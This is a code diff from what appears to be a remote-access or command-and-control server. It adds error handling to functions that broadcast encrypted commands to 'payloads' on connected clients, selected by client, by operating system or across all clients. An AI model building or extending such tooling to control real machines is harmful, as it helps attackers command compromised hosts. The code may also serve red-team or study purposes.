@@ -176,24 +176,36 @@ The bytesize of the messages being sent between the server and client is 1024.
                 # Flag to send command to all payloads on currently connected client
                 if current_all:
                     for connection in self.client_list[client_ip]:
-                        client: socket.socket = connection[0] # Get client information
-                        encrypted_command: str = self.encrypt_command(command, client)
-                        client.send(encrypted_command.encode()) # Send command to client
+                        try:
+                            client: socket.socket = connection[0] # Get client information
+                            encrypted_command: str = self.encrypt_command(command, client)
+                            client.send(encrypted_command.encode()) # Send command to client
+                        except:
+                            continue
                 
                 # Flag to send command to first payload on all clients
                 elif all_clients:
                     for connections in self.client_list.values():
-                        client: socket.socket = connections[0][0] # Get client information
-                        encrypted_command: str = self.encrypt_command(command, client)
-                        client.send(encrypted_command.encode()) # Send command to client
+                        try:
+                            client: socket.socket = connections[0][0] # Get client information
+                            encrypted_command: str = self.encrypt_command(command, client)
+                            client.send(encrypted_command.encode()) # Send command to client
+                        except:
+                            continue
                 
                 # Flag to send command to every payload on all clients
                 elif all_clients_payloads:
                     for connections in self.client_list.values():
-                        for connection in connections:
-                            client: socket.socket = connection[0] # Get client information
-                            encrypted_command: str = self.encrypt_command(command, client)
-                            client.send(encrypted_command.encode()) # Send command to client
+                        try:
+                            for connection in connections:
+                                try:
+                                    client: socket.socket = connection[0] # Get client information
+                                    encrypted_command: str = self.encrypt_command(command, client)
+                                    client.send(encrypted_command.encode()) # Send command to client
+                                except:
+                                    continue
+                        except:
+                            continue
 
                 # Flag to send command to first payload on all clients using a particular OS
                 elif all_OS:
@@ -217,10 +229,13 @@ The bytesize of the messages being sent between the server and client is 1024.
                     
                     # Send command to first payload on all clients using chosen_OS
                     for client_ip in self.client_list.keys():
-                        if self.client_list[client_ip][0][2] == chosen_OS:
-                            client: socket.socket = self.client_list[client_ip][0][0]
-                            encrypted_command: str = self.encrypt_command(command, client)
-                            client.send(encrypted_command.encode()) # Send command to client
+                        try:
+                            if self.client_list[client_ip][0][2] == chosen_OS:
+                                client: socket.socket = self.client_list[client_ip][0][0]
+                                encrypted_command: str = self.encrypt_command(command, client)
+                                client.send(encrypted_command.encode()) # Send command to client
+                        except:
+                            continue
                 
                 # Flag to send command on all payloads across all clients using a particular OS
                 elif all_OS_payloads:
@@ -244,9 +259,12 @@ The bytesize of the messages being sent between the server and client is 1024.
                     
                     # Send command to first payload on all clients using chosen_OS
                     for connection in self.OS_list[chosen_OS]:
-                        client: socket.socket = connection[0]
-                        encrypted_command: str = self.encrypt_command(command, client)
-                        client.send(encrypted_command.encode()) # Send command to client
+                        try:
+                            client: socket.socket = connection[0]
+                            encrypted_command: str = self.encrypt_command(command, client)
+                            client.send(encrypted_command.encode()) # Send command to client
+                        except:
+                            continue
 
                 # By default, encrypt command and send to first payload on currently connected client
                 else:
